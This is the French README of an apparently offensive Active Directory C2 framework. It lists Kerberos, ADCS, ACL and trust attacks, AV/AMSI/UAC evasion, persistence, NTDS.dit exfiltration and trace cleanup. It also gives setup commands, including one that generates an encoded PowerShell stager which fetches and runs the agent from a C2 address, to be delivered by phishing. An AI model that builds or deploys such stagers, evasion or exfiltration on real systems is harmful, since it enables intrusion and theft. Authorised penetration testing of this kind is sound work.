# AD Penetrator Framework

## Introduction

Le **AD Penetrator Framework** est une suite d'outils avancée et hautement modulaire conçue pour la reconnaissance, l'énumération, la détection de vulnérabilités et l'exploitation au sein des environnements Active Directory. Inspiré des frameworks de C2 (Command & Control), il offre une architecture distribuée avec un serveur central, un client opérateur interactif et des agents légers et furtifs déployés sur les systèmes cibles.

Ce framework vise à automatiser et à orchestrer des chaînes d'attaques complexes, allant des techniques classiques d'énumération LDAP aux abus de protocole avancés, en passant par l'exploitation de misconfigurations Active Directory et le mouvement latéral. Il est conçu pour être **ultra-scalable**, permettant l'ajout facile de nouvelles techniques et la personnalisation de playbooks pour des scénarios de test d'intrusion spécifiques et pour répondre aux besoins d'évaluation de la sécurité des environnements AD.

## Architecture

Le framework est bâti sur une architecture **Client-Serveur-Agent (C2)**, favorisant la modularité, l'évolutivité et la flexibilité d'exécution.

```
+-------------------+       +-------------------+       +--------------------+
|                   |       |                   |       |                    |
|      Client       |<----->|       Server      |<----->|       Agent(s)     |
|   (Operator PC)   |       |    (C2 Server)    |       |   (Target Hosts)   |
|                   |       |                   |       |                    |
+-------------------+       +-------------------+       +--------------------+
     Console CLI                API / Database            Executes Modules
     Playbook Orchestration     Task Management           Collects Data
     Result Display             Agent Control             Performs Exploits
                                Stores AD Data            Communicates back
```

### 1. Client (Operator Console)

Le client est l'interface utilisateur que l'opérateur utilise pour interagir avec le framework. C'est votre point de commande principal.

* **Interface interactive (CLI)**: Offre une expérience utilisateur riche pour la navigation, la commande et l'affichage des informations. Il permet de lister les agents actifs, de naviguer dans la base de données des objets AD découverts, de lancer des modules spécifiques sur un agent ou d'exécuter des "playbooks" complexes et automatisés.
* **Orchestration des Playbooks**: Permet de définir et de déclencher l'exécution de chaînes d'opérations pré-définies (ou personnalisées) sur les agents. Les playbooks peuvent inclure des logiques conditionnelles et des points d'interaction pour l'opérateur.
* **Visualisation des résultats**: Affiche les informations collectées, les alertes de vulnérabilité et les résultats d'exploitation de manière claire, structurée et personnalisable (verbosité, filtrage).

### 2. Server (C2 Server)

Le serveur est le cœur du framework, agissant comme le point de contrôle centralisé et la base de connaissances de toutes les opérations. Il peut être hébergé sur votre machine locale ou un VPS (Virtual Private Server).

* **API RESTful**: Expose une interface de programmation robuste et sécurisée pour la communication bidirectionnelle avec le client opérateur et les agents.
* **Base de données persistante**: Stocke de manière sécurisée toutes les informations découvertes sur l'environnement Active Directory (utilisateurs, groupes, ordinateurs, GPOs, trusts, ACLs, ADCS, etc.), l'état des agents, les tâches en cours, l'historique des opérations et leurs résultats. Cette base de connaissances centralisée permet des analyses relationnelles complexes et évite la ré-énumération.
* **Gestion des agents**: Gère l'enregistrement, le statut (online/offline), la version et la configuration des agents connectés, assurant un contrôle précis de chaque point de présence.
* **Gestion des tâches**: Distribue les tâches aux agents de manière asynchrone, gère leur file d'attente, leur priorité et collecte leurs résultats.

### 3. Agent (Target Host)

L'agent est le composant léger et furtif déployé sur les machines cibles au sein de l'environnement Active Directory.

* **Communication C2 résiliente et furtive**: Établit et maintient une connexion avec le serveur C2 via divers protocoles (HTTP/S simulant le trafic web légitime, DNS via requêtes TXT/A/AAAA, SMB via Named Pipes/shares) pour la furtivité et la résilience face aux défenses. Il intègre le "jitter" et le "sleep" pour varier les intervalles de communication et éviter les détections comportementales.
* **Exécution dynamique de modules**: Exécute les modules d'énumération, de découverte de vulnérabilités et d'exploitation reçus dynamiquement du serveur. L'agent ne contient pas tous les modules par défaut, réduisant ainsi son empreinte initiale.
* **Collecte et transmission de données**: Récupère les informations de l'environnement AD en utilisant des techniques natives ou des bibliothèques dédiées, et les envoie de manière structurée et compressée au serveur.
* **Adaptabilité et résilience**: Peut être configuré pour interagir avec l'opérateur avant d'effectuer des actions d'exploitation critiques ou pour agir de manière autonome selon des règles définies dans les playbooks. Il intègre des vérifications d'environnement (privilèges, présence d'outils de sécurité).

## Caractéristiques Clés et Capacités

Le AD Penetrator Framework est conçu pour couvrir un large éventail de techniques, des plus fondamentales aux plus avancées, organisées en modules dédiés.

### 1. Advanced Active Directory Enumeration

Exploration exhaustive et détaillée de l'environnement AD pour identifier les faiblesses.

* **Énumération générale**: Utilisateurs, groupes (locaux et de domaine), ordinateurs, contrôleurs de domaine, unités d'organisation (OU), sites et subnets.
* **Attributs détaillés**: Collecte d'attributs LDAP moins connus mais critiques (ex: `userAccountControl`, `msDS-SupportedEncryptionTypes`, `adminCount`, `dNSHostName`, `msDS-AllowedToDelegateTo`, `msDS-GroupManagedServiceAccount`).
* **Analyse des GPO (Group Policy Objects)**: Énumération des GPO, de leurs liens, de leurs ACLs (Access Control Lists), et recherche de configurations de sécurité faibles ou de GPO non liées.
* **ADCS (Active Directory Certificate Services)**: Énumération complète des Autorités de Certification (CA), de leurs configurations, et des templates de certificats (incluant leurs extensions critiques et les permissions d'inscription/lecture).
* **Analyse des ACLs (DACLs & SACLs)**: Scanner les listes de contrôle d'accès discrétionnaires (DACLs) et système (SACLs) sur des objets clés (Domaine, DCs, AdminSDHolder, utilisateurs/groupes privilégiés) pour détecter des permissions abusables.
* **SPN (Service Principal Names)**: Énumération des SPNs enregistrés, recherche de SPNs dupliqués ou mal configurés, et identification des comptes de service associés.
* **DNS AD-integrated**: Énumération des enregistrements DNS vulnérables, comme ceux permettant des mises à jour non authentifiées.
* **Active Directory Recycle Bin**: Récupération d'informations sensibles à partir d'objets récemment supprimés mais non encore purgés.

### 2. Advanced Active Directory Attacks & Abusing AD Protocols

Mise en œuvre de techniques d'exploitation avancées et d'abus des protocoles fondamentaux d'Active Directory.

* **Kerberos**:
    * **Kerberoasting**: Exploitation des SPNs pour obtenir des hachages de mots de passe de comptes de service.
    * **AS-REP Roasting**: Attaque sur les comptes qui ne requièrent pas la pré-authentification Kerberos.
    * **Silver Ticket**: Forger des tickets de service pour accéder à des services spécifiques sans contacter le KDC.
    * **Golden Ticket**: Créer un ticket d'octroi de ticket (TGT) falsifié pour obtenir des privilèges de Domain Admin persistants.
    * **S4U2P/S4U2Self Abuse**: Abus de la délégation contrainte et non contrainte.
* **LDAP**:
    * **Dumping sélectif**: Extraction d'attributs sensibles (LAPS, `msDS-KeyCredentialLink`).
    * **Shadow Credentials (ESC8+)**: Exploitation via la modification de l'attribut `msDS-KeyCredentialLink` pour usurper l'identité d'un compte.
* **SMB/RPC/WMI**:
    * **DCE/RPC Scanning**: Scan et exploitation des interfaces RPC exposées.
    * **SMB Session Hijacking**: Tentatives de détournement de sessions SMB existantes.
    * **WMI Abuse**: Exécution de commandes et récupération d'informations via Windows Management Instrumentation.
* **Password Spraying**: Tentative d'authentification d'un petit nombre de mots de passe sur un grand nombre de comptes utilisateurs.
* **DCSync**: Acquisition de NTLM hashes de tous les utilisateurs du domaine directement depuis un contrôleur de domaine (nécessite des droits spécifiques).

### 3. Abusing AD Misconfigurations

Exploitation des erreurs de configuration courantes ou complexes dans Active Directory.

* **ACLs faibles/Délégations abusives**: Identification et exploitation des DACLs qui permettent à des utilisateurs non privilégiés de modifier des objets sensibles (ex: droits `WriteDACL`, `WriteProperty` sur le domaine, des GPO, des utilisateurs admin, AdminSDHolder).
* **Délégation non contrainte/contrainte**: Détection et exploitation des attributs `msDS-AllowedToDelegateTo` et `userAccountControl` mal configurés.
* **Vulnérabilités ADCS (ESC1-ESC8)**: Détection et exploitation des 8 principales vulnérabilités d'Active Directory Certificate Services en analysant les templates, les ACLs des CAs et les configurations.
* **Gestion des groupes privilégiés**: Détection de membres inattendus ou mal gérés dans les groupes à privilèges élevés (Domain Admins, Enterprise Admins, Schema Admins).
* **LAPS Misconfigurations**: Identification des déploiements LAPS manquants ou mal configurés.
* **Objets orphelins ou non sécurisés**: Recherche d'objets AD obsolètes ou avec des ACLs par défaut dangereuses.

### 4. Abusing AD Trusts

Analyse et exploitation des relations de confiance entre domaines et forêts Active Directory.

* **Énumération des trusts**: Découverte des trusts, de leur directionnalité (unidirectionnelle, bidirectionnelle), du filtrage SID (SID Filtering) et de la mise en quarantaine (`SIDHistory Quarantining`).
* **Abus de délégation inter-domaines**: Exploitation des délégations configurées entre domaines pour l'élévation de privilèges ou le mouvement latéral.
* **Forging de tickets Kerberos**: Création de tickets pour des domaines liés, en abusant des trusts (ex: Golden Ticket inter-domaines).
* **Chemins de pivot**: Identification des chemins d'authentification potentiels à travers les trusts pour étendre l'accès à d'autres domaines ou forêts.

### 5. Command and Control (C2) Operations

La base de l'interaction avec les agents sur les cibles.

* **Canaux de communication divers**: HTTP/S, DNS, SMB pour la flexibilité et la furtivité.
* **Jitter et Sleep**: Pour simuler un trafic aléatoire et éviter la détection basée sur les intervalles de communication.
* **Communication bidirectionnelle sécurisée**: Pour l'envoi de commandes et la réception de résultats.
* **Chargement dynamique de modules**: Les modules sont poussés à l'agent à la demande, minimisant l'empreinte initiale de l'agent.

### 6. Windows Evasion

Techniques pour contourner les mécanismes de défense et rester indétecté.

* **Obfuscation de code**: Techniques pour rendre le code de l'agent plus difficile à analyser (renommage de variables, encodage).
* **Packaging furtif**: Utilisation de PyInstaller ou Nuitka avec des options pour réduire la détection d'exécutables.
* **Exécution en mémoire (Fileless)**: Privilégier l'exécution de code directement en mémoire pour éviter d'écrire sur disque.
* **Bypass AMSI (Antimalware Scan Interface)**: Techniques pour désactiver ou contourner la protection AMSI.
* **Bypass UAC (User Account Control)**: Méthodes pour exécuter du code avec des privilèges élevés sans déclencher l'UAC.
* **Bypass AppLocker**: Exploitation de vulnérabilités ou de politiques laxistes pour contourner AppLocker.
* **Anti-forensics / Anti-analysis**: Détection d'environnements virtualisés, de debuggers, et suppression/modification de traces.

### 7. Pivoting & Lateral Movement

Extension de l'accès et mouvement à travers le réseau cible.

* **Pass-the-Hash (PtH) / Pass-the-Ticket (PtT)**: Utilisation de hachages NTLM ou de tickets Kerberos pour s'authentifier sur d'autres systèmes.
* **Exécution à distance**: Via WMI, PsExec-like (SMBExec), WinRM, DCOM, et d'autres protocoles.
* **Reconnaissance de réseau local**: Découverte de nouvelles machines et services accessibles depuis l'agent.
* **Redéploiement d'agents**: Déploiement de nouveaux agents sur des hôtes récemment compromis pour étendre le contrôle.
* **Tunneling**: Création de tunnels pour acheminer le trafic C2 ou d'autres outils à travers des machines compromises.

### 8. Advanced Post-exploitation Tactics

Actions effectuées une fois l'accès initial et l'élévation de privilèges acquis, visant la persistance et l'exfiltration.

* **Mécanismes de persistance**:
    * Création de nouveaux comptes utilisateurs ou de services.
    * Modification de tâches planifiées ou de GPOs.
    * Utilisation de WMI Event Subscriptions pour la persistance.
    * Création de Golden Tickets (si Domain Admin) pour un accès persistant.
* **Data Exfiltration**:
    * Exfiltration de fichiers sensibles (NTDS.dit, SAM, ruches de registre).
    * Utilisation de canaux de communication alternatifs (DNS, HTTP lent) pour la furtivité de l'exfiltration.
* **Cleanup**: Suppression des traces d'activité (logs, outils déployés, comptes créés) pour rester indétecté.
* **Privilege Escalation Locale**: Modules pour l'élévation de privilèges sur la machine locale de l'agent si l'accès initial n'est pas suffisant (ex: de simple utilisateur à SYSTEM/Admin).

## Comment Utiliser

### 1. Prérequis

* **Python 3.x**: Le framework est entièrement développé en Python.
* **Environnements virtuels**: Fortement recommandé pour isoler les dépendances de chaque composant (client, serveur, agent, outils).
* **Connaissance d'Active Directory**: Une bonne compréhension des concepts AD est essentielle pour utiliser efficacement le framework.
* **Permissions**: Pour les tests d'intrusion, assurez-vous d'avoir les autorisations explicites nécessaires pour opérer sur le réseau cible.

### 2. Création de la Structure du Projet

Clonez le dépôt ou utilisez le script `create_project_structure.py` (si fourni) pour générer l'arborescence complète du framework avec des fichiers commentés :

```bash
python create_project_structure.py
```

### 3. Installation des Dépendances

Naviguez dans les répertoires respectifs (`server`, `client`, `agent`, `tools`) et installez les dépendances nécessaires.

**Exemple (liste non exhaustive, ajustez selon les implémentations exactes) :**

```bash
# Pour le serveur (dans le dossier `server`)
python -m venv venv_server
source venv_server/bin/activate # ou `venv_server\\Scripts\\activate` sur Windows
pip install fastapi uvicorn sqlalchemy pydantic psycopg2-binary # ou `sqlite3` pour la DB

# Pour le client (dans le dossier `client`)
python -m venv venv_client
source venv_client/bin/activate
pip install requests prompt_toolkit pyyaml pydantic

# Pour l'agent (dans le dossier `agent`, pour le développement et la compilation)
python -m venv venv_agent
source venv_agent/bin/activate
pip install ldap3 impacket pydantic

# Pour les outils de construction (dans le dossier `tools`)
python -m venv venv_tools
source venv_tools/bin/activate
pip install pyinstaller # ou d'autres outils d'obfuscation comme pyarmor
```

### 4. Configuration

Éditez les fichiers de configuration (ex: `server/config.py`, `shared/constants.py`) pour définir :

* Les informations de connexion à la base de données du serveur.
* Les profils de communication C2 (ports, protocoles, certificats TLS).
* Les options de logging et de verbosité.
* Les paramètres par défaut de l'agent (intervalles de communication, options de contournement).

### 5. Lancement du Serveur C2

```bash
cd ad_penetrator_framework/server
source venv_server/bin/activate
# Pour FastAPI:
uvicorn app:app --host 0.0.0.0 --port 8000 --reload
# Ou pour Flask:
python app.py
```
Le serveur écoutera les connexions des agents et du client opérateur.

### 6. Construction et Déploiement de l'Agent

* **Construire l'agent**: Naviguez vers le répertoire `tools`.
    ```bash
    cd ad_penetrator_framework/tools
    source venv_tools/bin/activate
    python build_agent.py --output-format exe --obfuscate # Pour un exécutable obfusqué
    # Ou pour un script Python simple:
    # python build_agent.py --output-format script
    ```
* **Générer un stager**: Créez un petit script pour le premier contact avec la cible, qui téléchargera et exécutera l'agent complet.
    ```bash
    python generate_stager.py --agent-url http://<YOUR_C2_IP>:8000/agent_binary --format powershell --encoder base64
    ```
* **Déployer le stager**: Exécutez le stager généré sur la ou les machines cibles via les vecteurs d'attaque initiaux (ex: phishing, exploitation d'une vulnérabilité web, accès physique).

### 7. Utilisation du Client Opérateur

```bash
cd ad_penetrator_framework/client
source venv_client/bin/activate
python console.py --c2-url http://<YOUR_C2_IP>:8000
```

Une fois connecté, l'interface CLI du client vous permettra :

* De lister les agents connectés et leurs informations.
* De naviguer et de requêter la base de données des objets Active Directory découverts par les agents.
* De lancer des modules d'énumération, de découverte ou d'exploitation sur des agents spécifiques.
* D'exécuter des **playbooks** prédéfinis ou personnalisés, qui peuvent inclure des logiques interactives pour la validation des étapes critiques.
* De visualiser les résultats détaillés de toutes les opérations en temps réel.

## Contribution

Ce framework est un projet ambitieux et en constante évolution. Les contributions sont les bienvenues et encouragées ! Si vous souhaitez :

* Ajouter de nouveaux modules d'énumération, de découverte ou d'exploitation.
* Améliorer les capacités de furtivité et d'évasion de l'agent.
* Optimiser les performances ou la résilience du serveur C2.
* Développer de nouveaux playbooks pour des scénarios d'attaque spécifiques.
* Améliorer l'interface utilisateur du client.

N'hésitez pas à ouvrir des issues pour signaler des bugs ou proposer des fonctionnalités, ou à soumettre des Pull Requests avec vos modifications.

## Avertissement

**Cet outil est conçu exclusivement à des fins éducatives, de recherche en sécurité et de tests d'intrusion autorisés et éthiques.**

L'utilisation de ce framework sur des systèmes sans autorisation explicite et préalable des propriétaires est **illégale et contraire à l'éthique**. L'auteur ne peut être tenu responsable de toute utilisation abusive, illégale ou non autorisée de ce logiciel. Il est de votre responsabilité de vous conformer à toutes les lois et réglementations applicables avant d'utiliser cet outil.
